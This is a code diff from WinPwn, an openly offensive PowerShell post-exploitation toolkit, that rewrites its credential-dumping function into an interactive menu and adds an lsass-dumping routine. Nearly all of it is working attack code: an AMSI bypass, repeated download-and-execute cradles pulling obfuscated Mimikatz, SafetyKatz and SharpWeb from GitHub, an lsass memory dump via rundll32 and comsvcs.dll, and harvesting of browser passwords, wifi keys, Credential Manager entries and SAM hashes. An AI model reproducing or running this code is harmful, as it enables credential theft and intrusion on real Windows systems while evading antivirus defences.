@@ -403,67 +403,117 @@ function kittielocal
 {
     <#
     .DESCRIPTION
-        Dumps Credentials from Memory / SAM Database.
+        Dumps Credentials from Memory / Registry / SAM Database.
         Author: @securethisshit
         License: BSD 3-Clause
     #>
     $currentPath = (Get-Item -Path ".\" -Verbose).FullName
     pathcheck
     AmsiBypass
-    IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/SecureThisShit/Creds/master/obfuscatedps/obfuskittie.ps1')
-    iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/SecureThisShit/Creds/master/obfuscatedps/DumpWCM.ps1')
+      
+        do
+        {
+	     @'
+             
+__        ___       ____                 
+\ \      / (_)_ __ |  _ \__      ___ __  
+ \ \ /\ / /| | '_ \| |_) \ \ /\ / | '_ \ 
+  \ V  V / | | | | |  __/ \ V  V /| | | |
+   \_/\_/  |_|_| |_|_|     \_/\_/ |_| |_|
+   --> Get some credentials
+'@
+            Write-Host "================ WinPwn ================"
+            Write-Host -ForegroundColor Green '1. Just run Invoke-WCMDump (no Admin need)! '
+            Write-Host -ForegroundColor Green '2. Run an obfuscated version of the powerhell kittie (Admin session only, heuristic detection likely)! '
+            Write-Host -ForegroundColor Green '3. Run Safetykatz in memory (Admin session only)! '
+            Write-Host -ForegroundColor Green '4. Only dump lsass using rundll32 technique! (Admin session only) '
+            Write-Host -ForegroundColor Green '5. Download and run lazagne (AV detection likely)! '
+            Write-Host -ForegroundColor Green '6. Dump Browser credentials using Sharpweb! (no Admin need)'
+            Write-Host -ForegroundColor Green '7. Run mimi-kittenz for extracting juicy info from memory! (no Admin need)'
+            Write-Host -ForegroundColor Green '8. Get some Wifi Credentials! (Admin session only)'
+	    Write-Host -ForegroundColor Green '9. Dump SAM-File for NTLM Hashes! (Admin session only'
+	    Write-Host -ForegroundColor Green '10. Exit. '
+            Write-Host "================ WinPwn ================"
+            $masterquestion = Read-Host -Prompt 'Please choose wisely, master:'
+            iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/SecureThisShit/Invoke-Sharpcradle/master/Invoke-Sharpcradle.ps1')
+
+            Switch ($masterquestion) 
+            {
+                1{iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/SecureThisShit/Creds/master/obfuscatedps/DumpWCM.ps1');Write-Host "Dumping now, output goes to .\Exploitation\WCMCredentials.txt"; Invoke-WCMDump >> $currentPath\Exploitation\WCMCredentials.txt}
+                2{if (isadmin){obfuskittiedump}}
+                3{if(isadmin){safedump}}
+                4{is(isadmin){dumplsass}}
+                5{lazagnemodule}
+                6{Write-Host -ForegroundColor Yellow 'Getting all theese Browser Creds using Sharpweb. Output goes to .\Exploitation\'; Invoke-Sharpcradle -uri https://github.com/SecureThisShit/Creds/raw/master/Ghostpack/SharpWeb.exe -argument1 all >> $currentPath\Exploitation\Browsercredentials.txt}
+		7{obfusminikittie}
+		8{if(isadmin){wificreds}}
+		9{if(isadmin){}}
+             }
+        }
+        While ($masterquestion -ne 10)
+        
+    function safedump
+    {
+    	iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/SecureThisShit/Invoke-Sharpcradle/master/Invoke-Sharpcradle.ps1')
+	Invoke-Sharpcradle -uri https://github.com/SecureThisShit/Creds/blob/master/Ghostpack/SafetyKatz.exe?raw=true
+    }
     
-    if (isadmin)
+    function obfuskittiedump
     {
-            $safety = Read-Host -Prompt 'Execute safetykatz instead of invoke-kittie in memory? (recommended) (yes/no)'
-            if ($safety -eq "yes" -or $safety -eq "y" -or $safety -eq "Yes" -or $safety -eq "Y")
-            {
-                Invoke-WCMDump >> $currentPath\Exploitation\WCMCredentials.txt
-                iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/SecureThisShit/Invoke-Sharpcradle/master/Invoke-Sharpcradle.ps1')
-                $lsass = Read-Host -Prompt 'Only dump lsass without using the cat (more stealth)? (recommended) (yes/no)'
-		        if ($lsass -eq "yes" -or $lsass -eq "y" -or $lsass -eq "Yes" -or $lsass -eq "Y")
-                {
-                    iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/SecureThisShit/Creds/master/PowershellScripts/SafetyDump.ps1')
-                    Write-Host -ForegroundColor Yellow 'Dumping lsass to C:\windows\temp\debug.bin :'
-                    Safetydump   
-                }
-                else{Invoke-Sharpcradle -uri https://github.com/SecureThisShit/Creds/blob/master/Ghostpack/SafetyKatz.exe?raw=true}
-		   
-            }
-            else
-            {
-                IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/SecureThisShit/Creds/master/obfuscatedps/mimi.ps1')
-                IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/SecureThisShit/Creds/master/PowershellScripts/Get-WLAN-Keys.ps1')
-                
-                Write-Host -ForegroundColor Yellow 'Dumping Windows Credential Manager:'
-                Invoke-WCMDump >> $currentPath\Exploitation\WCMCredentials.txt
-                
-                $output_file = Read-Host -Prompt 'Save credentials to a local text file? (yes/no)'
-                if ($output_file -eq "yes" -or $output_file -eq "y" -or $output_file -eq "Yes" -or $output_file -eq "Y")
-                {
-                    Write-Host -ForegroundColor Yellow 'Dumping Credentials from lsass.exe:'
-                    Invoke-Mimikatz >> $currentPath\Exploitation\Credentials.txt
-                    Get-WLAN-Keys >> $currentPath\Exploitation\WIFI_Keys.txt
-                }
-                else
-                {
-                Invoke-Mimikatz
-                Get-WLAN-Keys
-                }
-            }
+    	IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/SecureThisShit/Creds/master/obfuscatedps/mimi.ps1')
+	Write-Host -ForegroundColor Yellow "Dumping Credentials output goes to .\Exploitation\Credentials.txt"
+        Invoke-Mimikatz >> $currentPath\Exploitation\Credentials.txt
     }
-    else
+    function wificreds
     {
-        Write-Host -ForegroundColor Yellow 'You need local admin rights for this, only dumping Credential Manager now!'
-        Write-Host -ForegroundColor Yellow 'Dumping Windows Credential Manager:'
-        Invoke-WCMDump >> $currentPath\Exploitation\WCMCredentials.txt
-        Write-Host -ForegroundColor Yellow 'Running the small kittie:'
-        inbox >> $currentPath\Exploitation\kittenz.txt
-
+    	IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/SecureThisShit/Creds/master/PowershellScripts/Get-WLAN-Keys.ps1')
+	Write-Host "Saving to .\Exploitation\WIFI_Keys.txt"
+	Get-WLAN-Keys >> $currentPath\Exploitation\WIFI_Keys.txt
     }
-
+    
+    function obfusminikittie
+    {
+    	IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/SecureThisShit/Creds/master/obfuscatedps/obfuskittie.ps1')
+	Write-Host -ForegroundColor Yellow 'Running the small kittie, output to .\Exploitation\kittenz.txt'
+	inbox >> $currentPath\Exploitation\kittenz.txt
+    }
+    
+    function samfile
+    {
+    	iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/SecureThisShit/Creds/master/PowershellScripts/Invoke-PowerDump.ps1')
+    	Write-Host "Dumping SAM, output to .\Exploitation\SAMDump.txt"
+	Invoke-PowerDump >> $currentPath\Exploitation\SAMDump.txt
+    }
 }
 
+function dumplsass
+{
+<#
+        .DESCRIPTION
+        Dump lsass, credit goes to https://modexp.wordpress.com/2019/08/30/minidumpwritedump-via-com-services-dll/
+        Author: @securethisshit
+        License: BSD 3-Clause
+    #>
+    pathcheck
+    $currentPath = (Get-Item -Path ".\" -Verbose).FullName
+    if (isadmin)
+    {
+    	try{
+    	$processes = Get-Process
+    	$dumpid = foreach ($process in $processes){if ($process.ProcessName -eq "lsass"){$process.id}}
+	Write-Host "Found lsass process with ID $dumpid - starting dump with rundll32"
+	Write-Host "Dumpfile goes to .\Exploitation\$env:computername.dmp "
+	rundll32 C:\Windows\System32\comsvcs.dll, MiniDump $dumpid $currentPath\$env:computername.dmp full
+	}
+	catch{
+		Write-Host "Something went wrong, using safetykatz instead"
+                 iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/SecureThisShit/Creds/master/PowershellScripts/SafetyDump.ps1')
+                 Write-Host -ForegroundColor Yellow 'Dumping lsass to C:\windows\temp\debug.bin :'
+                 Safetydump
+	}
+    }
+    else{Write-Host "No Admin rights, start again using a privileged session!"}
+}
 
 function localreconmodules
 {
